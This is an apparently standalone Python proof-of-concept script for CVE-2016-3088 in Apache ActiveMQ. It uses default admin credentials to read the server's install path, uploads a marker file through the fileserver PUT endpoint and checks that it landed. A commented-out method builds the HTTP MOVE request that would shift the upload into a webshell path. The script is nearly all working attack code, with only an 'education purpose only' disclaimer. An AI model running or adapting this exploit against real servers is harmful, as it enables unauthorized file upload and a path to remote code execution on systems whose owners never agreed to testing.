#!/usr/bin/env python
#__author__ == 'Kios'
#__Email__ == 'root@mkernel.com'

import re
import base64
import requests
import sys

class Poc(object):
    '''
    CVE-2016-3088 Proof of Concept. 
    Education Purpose only! Do not use illgal way!
    '''
    def __init__(self, url,username='admin', password='admin'):
        self.url = url
        self.username = username
        self.password = password

    def _findInstallLocation(self):
        '''
        Find ActiveMQ install location 
        '''
        _findUrl = self.url + '/admin/test/systemProperties.jsp'
        auth = self.username + ':' + self.password
        auth_bytes_like = auth.encode(encoding='utf-8')
        auth_encode_str = base64.b64encode(auth_bytes_like)
        output_Basic = 'Basic '.encode(encoding='utf-8')
        Authorization_params = output_Basic + auth_encode_str
        headers = {
            'Authorization':Authorization_params
        }
        
        r = requests.get(_findUrl, headers=headers)
        pageSource = r.text
        regex1 = 'activemq\.home</td>\\n(.*)</td>'
        home_directory = re.findall(regex1, pageSource)[0][6:]
        
        return home_directory

    def _putJspWebshell(self):
        '''
        Put file 4 verfication
        '''
        auth = self.username + ':' + self.password
        auth_bytes_like = auth.encode(encoding='utf-8')
        auth_encode_str = base64.b64encode(auth_bytes_like)
        output_Basic = 'Basic '.encode(encoding='utf-8')
        Authorization_params = output_Basic + auth_encode_str
        headers = {
            'Authorization':Authorization_params
        }
        put_file = '''
        EvilCorp
        '''
        put_url = self.url + '/fileserver/tmp_2018.txt'
        r = requests.put(put_url, headers=headers, data=put_file)
        
        #print(r.status_code)
        if r.status_code == 204:
            #print("Successful!")
            return True
        else:
            #print("Failure!")
            return False
#     def _createSock(self):
#         '''
#         create sock and return it
#         '''
#         try:
#             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#             sock.connect((self.host, int(self.port)))
#             return sock
#         except Exception as e:
#             print("Error Encountered! due to %s"%str(e))
#             return None
            
    
#     def _moveJspWebshell(self):
#         '''
#         move file to verify
#         '''
#         auth = self.username + ':' + self.password
#         auth_bytes_like = auth.encode(encoding='utf-8')
#         auth_encode_str = base64.b64encode(auth_bytes_like)
#         output_Basic = 'Basic '.encode(encoding='utf-8')
#         Authorization_params = output_Basic + auth_encode_str
        
#         destination_path = 'file://' + self._findInstallLocation() + '/webshell/test.jsp'
#         move_data = '''
#         MOVE /fileserver/tmp_2018.txt HTTP/1.1
#         Destination: {}
#         Host: localhost:8161
#         Cache-Control: max-age=0
#         Accept: */*
#         Accept-Language: en
#         User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
#         Connection: close
#         Content-Length: 0
#         '''.format(destination_path)
        
#         print(move_data)
        
#         sock = self._createSock()
#         sock.sendall(move_data)
        
#         #print(destination_path)

        
    def _check(self):
        '''
        Check whether text was in server.
        '''
        check_url = self.url + '/fileserver/tmp_2018.txt'
        auth = self.username + ':' + self.password
        auth_bytes_like = auth.encode(encoding='utf-8')
        auth_encode_str = base64.b64encode(auth_bytes_like)
        output_Basic = 'Basic '.encode(encoding='utf-8')
        Authorization_params = output_Basic + auth_encode_str
        headers = {
            'Authorization':Authorization_params
        }
        r = requests.get(check_url, headers=headers)
        if 'EvilCorp' in r.text:
            return True
        else:
            return False
        
    def run(self):
        self._findInstallLocation()
        self._putJspWebshell()
        flag = self._check()
        if flag == True:
            print("ActiveMQ is vulnerable!")
        else:
            print("ActiveMQ is not vulnerable!")
       


if __name__ == '__main__':
    obj1 = Poc('http://127.0.0.1:8161')
    obj1.run()

